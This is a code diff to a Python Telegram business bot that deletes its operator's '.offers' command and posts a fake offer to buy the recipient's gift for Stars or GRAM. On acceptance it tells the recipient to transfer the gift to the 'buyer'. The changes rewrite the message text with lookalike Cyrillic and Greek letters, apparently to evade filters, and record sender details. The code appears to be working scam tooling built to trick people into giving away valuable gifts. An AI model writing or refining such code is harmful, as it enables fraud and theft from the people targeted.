@@ -150,12 +150,20 @@ async def handle_offer(message: Message) -> None:
     if not data:
         return
 
+    user = message.from_user
+    if not user:
+        return
+
+    username = user.username or f"id{user.id}"
+    sender_id = user.id
+    sender_username = user.username
+
     try:
         await bot.delete_business_messages(
             business_connection_id=bc_id,
             message_ids=[message.message_id],
         )
-        logger.info("команда офферс удалена")
+        logger.info("Команда .offers удалена")
     except Exception as e:
         logger.warning(f"delete failed: {e}")
 
@@ -169,20 +177,22 @@ async def handle_offer(message: Message) -> None:
         currency_word = "GRАM"
     else:
         emoji = f'<tg-emoji emoji-id="{EMOJI_STARS}">⭐</tg-emoji>'
-        currency_word = "Stаrs"
+        currency_word = "Ѕtarѕ"
 
     gift_display = f'<a href="{data["link"]}"><b>{data["gift_name"]} #{number_fmt}</b></a>'
 
     text = (
-        f"Thе usеr is оffеring yоu\n"
+        f"Uѕer <b>{username}</b> іѕ οfferіng yοu "
         f"<b>{amount_fmt} {currency_word}</b> {emoji} "
-        f"fоr thе gift {gift_display}.\n\n"
-        f"Thе оffеr is vаlid fоr аnоthеr <b>6 h. 0 min</b>.."
+        f"fοr the gіft {gift_display}.\n\n"
+        f"Τhіѕ οffer expіreѕ іn <b>5h 59m</b>."
     )
 
     offer_id = uuid.uuid4().hex[:12]
     offers[offer_id] = {
         **data,
+        "sender_id": sender_id,
+        "sender_username": sender_username,
         "bc_id": bc_id,
         "chat_id": message.chat.id,
         "accepted": False,
@@ -223,6 +233,10 @@ async def handle_decline(callback: CallbackQuery) -> None:
     _, offer_id = callback.data.split(":", 1)
     data = offers.get(offer_id)
     if not data or data.get("accepted"):
+        try:
+            await callback.answer()
+        except Exception:
+            pass
         return
 
     decline_text = (
@@ -248,6 +262,10 @@ async def handle_accept(callback: CallbackQuery) -> None:
     _, offer_id = callback.data.split(":", 1)
     data = offers.get(offer_id)
     if not data or data.get("accepted"):
+        try:
+            await callback.answer()
+        except Exception:
+            pass
         return
 
     data["accepted"] = True
@@ -262,7 +280,7 @@ async def handle_accept(callback: CallbackQuery) -> None:
     gift_display = f'<a href="{data["link"]}"><b>{data["gift_name"]} #{number_fmt}</b></a>'
 
     accept_text = (
-        f'Gіft {gift_display} '
+        f"Gіft {gift_display} "
         f"haѕ been ѕucceѕѕfully ѕοld!\n\n"
         f"<b>• Τranѕfer the gіft tο the buyer tο receіve yοur {currency_word}.</b>"
     )
@@ -308,7 +326,7 @@ async def handle_confirm_transfer(callback: CallbackQuery) -> None:
 
 
 async def main() -> None:
-    logger.info("бот запущен")
+    logger.info("Бот запущен...")
     await dp.start_polling(bot)
 
 
